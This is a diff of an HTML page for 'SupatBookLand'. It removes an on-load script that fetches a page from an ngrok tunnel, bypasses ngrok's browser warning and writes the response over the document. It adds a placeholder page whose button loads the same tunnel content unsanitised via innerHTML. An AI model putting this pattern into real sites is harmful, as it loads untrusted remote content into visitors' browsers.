@@ -2,24 +2,41 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Redirecting...</title>
-    <script>
-        function redirect() {
-            var xhr = new XMLHttpRequest();
-            xhr.open('GET', 'https://92bd-103-151-34-21.ngrok-free.app/', true);
-            xhr.setRequestHeader('ngrok-skip-browser-warning', '1');
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState === 4) {
-                    document.open();
-                    document.write(xhr.responseText);
-                    document.close();
-                }
-            };
-            xhr.send(null);
-        }
-    </script>
+    <title>SupatBookLand</title>
+    <style>
+        body { font-family: Arial, sans-serif; line-height: 1.6; padding: 20px; }
+        h1 { color: #333; }
+    </style>
 </head>
-<body onload="redirect()">
-    <p>Redirecting... If you are not redirected, <a href="#" onclick="redirect(); return false;">click here</a>.</p>
+<body>
+    <h1>Welcome to SupatBookLand</h1>
+    <p>This is a placeholder page for SupatBookLand. You can add your content here.</p>
+    <p>To access the original content, please use the following steps:</p>
+    <ol>
+        <li>Open your browser's developer tools (usually F12 or right-click and select "Inspect")</li>
+        <li>Go to the "Network" tab</li>
+        <li>Click on the "Fetch/XHR" filter</li>
+        <li>Click the button below to load content</li>
+    </ol>
+    <button onclick="loadContent()">Load Content</button>
+    <div id="content"></div>
+
+    <script>
+    function loadContent() {
+        fetch('https://92bd-103-151-34-21.ngrok-free.app/', {
+            headers: {
+                'ngrok-skip-browser-warning': '1'
+            }
+        })
+        .then(response => response.text())
+        .then(data => {
+            document.getElementById('content').innerHTML = data;
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            document.getElementById('content').innerHTML = 'Error loading content. Please try again.';
+        });
+    }
+    </script>
 </body>
 </html>
